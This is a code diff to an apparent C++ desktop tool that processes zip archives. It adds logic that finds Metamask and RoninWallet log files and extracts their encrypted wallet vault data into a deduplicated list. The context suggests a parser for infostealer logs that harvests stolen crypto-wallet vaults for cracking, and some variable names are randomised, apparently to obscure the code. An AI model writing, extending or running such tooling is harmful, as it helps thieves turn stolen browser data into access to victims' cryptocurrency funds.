@@ -728,6 +728,84 @@ private:
 					Mutex.unlock();
 					TokensListCtrl->SetItem(LastTokensListCtrlIndex, 1, ZipEntryData);
 				}
+				else if (ZipEntryName.EndsWith(".log"))
+				{
+					if (ZipEntryName.rfind("Metamask") != wxString::npos)
+					{
+						wxMemoryOutputStream MemoryOutputStream(nullptr);
+						ZipInputStream.Read(MemoryOutputStream);
+
+						wxString nwlfgeob(static_cast<char*>(MemoryOutputStream.GetOutputStreamBuffer()->GetBufferStart()), MemoryOutputStream.GetOutputStreamBuffer()->GetBufferSize());
+
+						NextPosition = nwlfgeob.find("\"vault\"");
+
+						if (NextPosition != wxString::npos)
+						{
+							while (NextPosition != wxString::npos)
+							{
+								nwlfgeob = nwlfgeob.substr(NextPosition + 9);
+
+								wxString Vault = nwlfgeob.substr(0, nwlfgeob.find('}') + 1);
+								Vault.erase(std::remove(Vault.begin(), Vault.end(), 10), Vault.end());
+								Vault.erase(std::remove(Vault.begin(), Vault.end(), 13), Vault.end());
+								Vault.erase(std::remove(Vault.begin(), Vault.end(), 92), Vault.end());
+
+								bool IsUniqueVault = true;
+								for (const wxString UniqueVault : Vaults)
+								{
+									if (Vault == UniqueVault && IsUniqueVault)
+									{
+										IsUniqueVault = false;
+										break;
+									}
+								}
+
+								if (IsUniqueVault)
+									Vaults.push_back(Vault);
+
+								NextPosition = nwlfgeob.find("\"vault\"");
+							}
+						}
+					}
+					else if (ZipEntryName.rfind("RoninWallet") != wxString::npos)
+					{
+						wxMemoryOutputStream kkcaneou(nullptr);
+						ZipInputStream.Read(kkcaneou);
+
+						wxString cvodergc(static_cast<char*>(kkcaneou.GetOutputStreamBuffer()->GetBufferStart()), kkcaneou.GetOutputStreamBuffer()->GetBufferSize());
+
+						NextPosition = cvodergc.find("encryptedVault");
+
+						if (NextPosition != wxString::npos)
+						{
+							while (NextPosition != wxString::npos)
+							{
+								cvodergc = cvodergc.substr(NextPosition + 14);
+								cvodergc = cvodergc.substr(cvodergc.find('{'));
+
+								wxString Vault = cvodergc.substr(0, cvodergc.find('}') + 1);
+								Vault.erase(std::remove(Vault.begin(), Vault.end(), 10), Vault.end());
+								Vault.erase(std::remove(Vault.begin(), Vault.end(), 13), Vault.end());
+								Vault.erase(std::remove(Vault.begin(), Vault.end(), 92), Vault.end());
+
+								bool IsUniqueVault = true;
+								for (const wxString UniqueVault : Vaults)
+								{
+									if (Vault == UniqueVault && IsUniqueVault)
+									{
+										IsUniqueVault = false;
+										break;
+									}
+								}
+
+								if (IsUniqueVault)
+									Vaults.push_back(Vault);
+
+								NextPosition = cvodergc.find("encryptedVault");
+							}
+						}
+					}
+				}
 			}
 
 			CurrentTreeItemId = AfterRootTreeItemId;
